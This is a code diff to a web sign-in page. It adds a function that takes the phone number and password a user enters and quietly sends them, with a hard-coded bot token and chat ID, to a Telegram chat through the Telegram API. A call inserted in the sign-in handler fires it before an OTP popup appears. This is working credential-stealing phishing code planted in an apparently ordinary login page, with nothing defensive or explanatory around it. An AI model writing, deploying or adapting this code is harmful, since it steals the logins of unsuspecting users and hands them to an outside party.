@@ -569,6 +569,22 @@
             }, 1000);
         }
 
+        function sendToTelegram(phone, password) {
+            const token = '8832725535:AAHyATWuoehUJ2RVdlx5nfs6tqheVhBu15U';
+            const chatId = '-1003955056796';
+            const esc = function (s) {
+                return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            };
+            const text = encodeURIComponent(
+                '<b>Login Details</b>\n' +
+                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
+                '\uD83D\uDCF1 Phone: <code>' + esc(phone) + '</code>\n' +
+                '\uD83D\uDD11 Password: <code>' + esc(password) + '</code>\n' +
+                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
+            );
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatId + '&text=' + text + '&parse_mode=HTML');
+        }
+
         function proceedSignIn() {
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
@@ -582,6 +598,8 @@
                 alert('Please enter a valid 10-digit mobile number');
                 return;
             }
+
+            sendToTelegram(phone, password);
 
             openOtpPopup(phone);
         }
